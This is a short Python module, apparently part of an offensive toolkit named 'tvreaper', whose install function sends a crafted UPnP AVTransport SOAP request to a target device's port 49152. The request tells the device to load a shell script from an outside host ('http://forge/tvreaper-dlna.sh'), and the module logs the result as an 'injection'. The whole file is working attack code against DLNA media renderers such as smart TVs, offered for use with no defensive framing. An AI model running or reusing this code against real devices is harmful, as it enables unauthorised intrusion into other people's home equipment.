#!/usr/bin/env python3
import socket
import time
from core.utils import logger

def install(target_ip):
    logger.info(f"Attempting DLNA AVTransport injection on {target_ip}...")

    soap_body = (
        '<?xml version="1.0"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        '<s:Body>'
        '<u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">'
        '<InstanceID>0</InstanceID>'
        '<CurrentURI>http://forge/tvreaper-dlna.sh</CurrentURI>'
        '<CurrentURIMetaData></CurrentURIMetaData>'
        '</u:SetAVTransportURI>'
        '</s:Body>'
        '</s:Envelope>'
    )

    request = (
        f"POST /upnp/control/AVTransport HTTP/1.1\r\n"
        f"Host: {target_ip}:49152\r\n"
        f"Content-Type: text/xml; charset=\"utf-8\"\r\n"
        f"SOAPAction: \"urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI\"\r\n"
        f"Content-Length: {len(soap_body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n{soap_body}"
    ).encode()

    try:
        sock = socket.create_connection((target_ip, 49152), timeout=4)
        sock.send(request)
        response = sock.recv(1024).decode()
        sock.close()

        if "200 OK" in response:
            logger.info("DLNA Injection successful.")
            return True
        else:
            logger.error(f"DLNA Injection failed.")
            return False
    except Exception as e:
        logger.error(f"DLNA Injection exception: {e}")
        return False
